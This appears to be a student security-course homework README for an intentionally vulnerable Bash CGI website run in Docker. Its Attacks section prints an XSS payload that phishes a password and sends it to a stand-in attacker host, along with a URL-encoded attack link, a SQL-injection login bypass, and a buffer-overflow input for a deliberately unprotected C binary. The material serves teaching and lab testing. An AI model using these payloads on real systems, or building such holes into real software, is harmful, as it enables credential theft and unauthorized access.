# lingi2347-CSS-homework2
Homework 2

> Authors: Alexandre Hauet <alexandre.hauet@student.uclouvain.be> & Tanguy Vaessen <tanguy.vaessen@student.uclouvain.be>
> Group 27

# Introduction
We have built a super easy website from scratch based only on CGI scripts written in Bash.
To ease the development on mulitple platforms, we have worked with docker.

## Structure
We have 2 docker images:
  - The main one is called "my-apache2" and runs an Apache2 server with the vulnerable website
  - Thesecond one, called "my-postgresql", runs a PostgreSQL instance.

The file structure is the following:

    |-- build-and-run.bat         use this file on a Windows machine to launch the project
    |-- build-and-run.sh          use this file on a Unix machine to launch the project
    |-- Dockerfile                my-apache2 dockerfile
    |-- README.md                 this readme
    |-- attacks                   folder containing the attacks
    |   |-- overflow_bin          folder containing the C program vulnerable to bufferoverflow
    |   |   |-- root_access.c     C program vulnerable to bufferoverflow
    |   |-- SQL_injection.md      description of SQL injection attack
    |   |-- XSS-attack.md         description of XSS attack
    |-- cgi-scripts               folder containing the website built by CGI scripts written in Bash
    |   |-- login.cgi             main page of the website
    |   |-- root.cgi              admin page of the website
    |-- postgreSQL                folder containing "my-postgresql" docker
    |   |-- SQL_dump              folder containing SQL files used to populate the DB
    |   |   |-- _db_creation.sql  creates the database
    |   |   |-- user.sql          creates and populates the users table
    |   |-- Dockerfile            my-postgresql dockerfile
    |-- secu.com                  welcome folder of apache server
    |   |-- index.html            welcome page of apache server

## How to start
### With Docker
- Install docker
- Run `build-and-run` script
- Access http://locahost

### Without Docker
- Copy the content of *cgi-scripts* to */usr/lib/cgi-bin/*
- Make *login.cgi* and *root.cgi* executable
- Build *attacks/overflow_bin/root_access.c* with `gcc -fno-stack-protector root_access.c -o root_access`
- Copy the binary to */home/root_access*
- Access http://locahost

# Login page
Accessible at http://locahost/cgi-bin/login.cgi

Show a simple login form with username and password.
You can login with *username=oreo* and *password=wfZB5XrH*

When logged in, you will access your personal page showing the password in plain text.

# Admin page
Accessible at http://locahost/cgi-bin/root.cgi

It shows a simple password field. The password is *rootpassword*
When the password is valid, a list of all users and their passwords is shown.

# Attacks
##XSS injection
XSS is a injection of code inside the web site. A way to make this kind of attack is to do the injection by adding code to the url.

Here is the script we would like to execute on the victim's machine

    var p = prompt("Veuillez entrez a nouveau votre mot de passe");
    o = document.createElement('img');
    o.setAttribute('src', 'http://www.evil-attacker-website.com/password=' + p);
    document.body.appendChild(o);

This code will prompt for the user's password, create an image with the password in the URL and append it to the body, making the browser send a request to our malicious server that will log the password.

## Minified version

    var p=prompt("Veuillez entrez a nouveau votre mot de passe");o=document.createElement('img');o.setAttribute('src','http://www.evil-attacker-website.com/password='+p);document.body.appendChild(o)

## URL to attack, only work in Firefox:
Send this URL to a victim to start the attack.
This not a permanent XSS attack.
http://localhost/cgi-bin/login.cgi?username=%3Cscript%3Evar%20stolenPassword%20=%20prompt(%22Veuillez%20entrez%20%C3%A0%20nouveau%20votre%20mot%20de%20passe%22);o%20=%20document.createElement(%27img%27);o.setAttribute(%27src%27,%20%27http://www.evil-attacker-website.com/password=%27%20+%20stolenPassword);document.body.appendChild(o);%3C/script%3E&password=foobar


##SQL injection
An SQL injection is possible on the Login page.
On field *username*, close a single quote and add "--" to comment the rest of the SQL query. Doing so, no password will be verified.

Example: `Username: oreo'--`

Others SQL attacks are possible.

## Buffer overflow
The script *root_access* take an argument, copy it into a buffer of 15 bytes and compare its value. If content is *rootpassword*, the variable *password_correct* is set to 1.
With a buffer overflow, we can write the value of *password_correct* and make the script always print *true*.

On the Admin page, enter *hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh* to perform the buffer overflow

The attack works as soon as the input field is more than 28 chars.
The attack works until 40 chars. 40 chars or more cause a segmentation fault.
